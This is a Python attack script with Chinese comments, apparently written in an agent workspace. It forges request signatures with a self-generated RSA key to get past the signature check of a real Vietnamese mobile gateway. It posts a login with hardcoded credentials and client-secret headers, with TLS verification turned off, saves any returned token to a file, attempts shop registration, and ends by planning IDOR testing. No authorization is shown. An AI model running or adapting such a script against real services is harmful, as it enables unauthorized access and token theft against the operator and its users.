#!/usr/bin/env python3
"""
模拟EMSONE RSA签名生成
关键测试：服务器是否接受任意RSA密钥对生成的签名
"""

import requests
import json
import urllib3
import base64
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

urllib3.disable_warnings()

print("="*70)
print(" 模拟RSA签名 - 测试服务器是否验证公钥来源")
print("="*70)

# ================================================================
# 1. 生成本地RSA密钥对
# ================================================================
print("\n[1] 生成RSA-2048密钥对...")

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

public_key = private_key.public_key()

print("✓ RSA密钥对已生成")

# ================================================================
# 2. 导出公钥（Base64格式）
# ================================================================
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

public_key_b64 = base64.b64encode(public_key_pem).decode('utf-8')

print(f"✓ 公钥（前50字符）: {public_key_b64[:50]}...")

# ================================================================
# 3. 构造签名字符串（按APP逻辑）
# ================================================================
login_data = {
    "phone": "difoco",
    "password": "43824893"
}

request_data = {
    "channel": "ANDROID",
    "code": "EMPLOYEE_LOGIN_V2",
    "data": json.dumps(login_data, separators=(',', ':')),
    "signature": ""
}

# 根据generateSignature()方法
# signString = code + " | " + data + " | " + channel + " | " + signature
sign_string = " | ".join([
    request_data["code"],
    request_data["data"],
    request_data["channel"],
    request_data["signature"]
])

print(f"\n[2] 签名字符串:")
print(f"    {sign_string[:100]}...")

# ================================================================
# 4. 生成RSA签名
# ================================================================
print("\n[3] 生成RSA SHA256withRSA签名...")

signature_bytes = private_key.sign(
    sign_string.encode('utf-8'),
    padding.PKCS1v15(),
    hashes.SHA256()
)

signature_b64 = base64.b64encode(signature_bytes).decode('utf-8')

print(f"✓ 签名（前50字符）: {signature_b64[:50]}...")

# ================================================================
# 5. 构造完整HTTP请求
# ================================================================
headers = {
    'X-Client-ID': 'android_app_987654',
    'X-Client-Secret': 'android_s3cr3t_uvwxzy',
    'Content-Type': 'application/json',
    'platform': 'android',
    'device_name': 'Simulated',
    'device_model': 'Python',
    'device_id': 'sim_001',
    'version': '1.1.5',
    'signature': signature_b64,
    'public_key': public_key_b64,
}

print(f"\n[4] 发送请求到服务器...")
print(f"    URL: https://gwmobile.emsone.com.vn/execute")

# ================================================================
# 6. 发送请求
# ================================================================
try:
    r = requests.post(
        "https://gwmobile.emsone.com.vn/execute",
        json=request_data,
        headers=headers,
        timeout=15,
        verify=False
    )
    
    print(f"\n[5] 响应结果:")
    print(f"    HTTP {r.status_code}")
    
    result = r.json()
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    code = result.get('Code')
    message = result.get('Message')
    
    print(f"\n" + "="*70)
    
    if code == '00':
        print("✅✅✅ 成功！服务器接受了我们的RSA签名！")
        print("✅ 服务器不验证公钥来源！")
        print("✅ 可以使用自定义RSA密钥登录！")
        
        if 'Token' in result:
            token = result.get('Token')
            print(f"\n🎉 获得Token: {token[:50]}...")
            
            # 保存Token
            with open('/workspace/extracted_token.txt', 'w') as f:
                f.write(token)
            print(f"✓ Token已保存到: /workspace/extracted_token.txt")
        
    elif code == '01':
        print("✅✅ 签名有效！但登录失败（账号密码错误）")
        print("✅ 服务器接受了自定义RSA签名！")
        print("🎯 现在可以尝试其他账号或注册！")
        
    elif code == '95':
        print("❌ 签名验证失败")
        print("可能原因:")
        print("  1. 服务器验证公钥必须匹配预注册的公钥")
        print("  2. 签名字符串构造不正确")
        print("  3. 签名算法参数不匹配")
        
    elif code == '97':
        print("❌ 仍然需要Token（不应该发生）")
    
    else:
        print(f"⚠️ 未知响应: Code {code}")
    
    print("="*70)
    
except Exception as e:
    print(f"\n[!] 错误: {e}")
    import traceback
    traceback.print_exc()

# ================================================================
# 7. 测试注册接口（如果登录失败）
# ================================================================
print("\n\n" + "="*70)
print(" 测试注册接口")
print("="*70)

register_data = {
    "mobileNumber": "0999888777",
    "fullName": "Test User",
    "email": "test@example.com",
    "address": "Test Address",
    "storeName": "Test Store",
    "productBusiness": "Test Products",
    "typeBusiness": "Retail",
}

register_request = {
    "channel": "ANDROID",
    "code": "SHOP_REGISTER",
    "data": json.dumps(register_data, separators=(',', ':')),
    "signature": ""
}

# 生成新的签名
sign_string_reg = " | ".join([
    register_request["code"],
    register_request["data"],
    register_request["channel"],
    register_request["signature"]
])

signature_bytes_reg = private_key.sign(
    sign_string_reg.encode('utf-8'),
    padding.PKCS1v15(),
    hashes.SHA256()
)

signature_b64_reg = base64.b64encode(signature_bytes_reg).decode('utf-8')

headers['signature'] = signature_b64_reg

print("\n[*] 发送注册请求...")

try:
    r = requests.post(
        "https://gwmobile.emsone.com.vn/execute",
        json=register_request,
        headers=headers,
        timeout=15,
        verify=False
    )
    
    result = r.json()
    print(f"\nHTTP {r.status_code}")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    if result.get('Code') == '00':
        print("\n✅ 注册成功！")
    elif result.get('Code') == '01':
        print("\n✅ 签名有效，但注册失败（可能缺少参数）")
    
except Exception as e:
    print(f"错误: {e}")

print("\n\n" + "="*70)
print(" 总结")
print("="*70)
print("""
如果看到 Code 00 或 01 → 服务器接受任意RSA密钥！✅
如果看到 Code 95 → 必须使用APP预注册的公钥 ❌
如果看到 Code 97 → 该端点还需要Token

下一步：
- 如果成功：立即测试IDOR漏洞
- 如果失败：需要Android环境提取真实密钥
""")
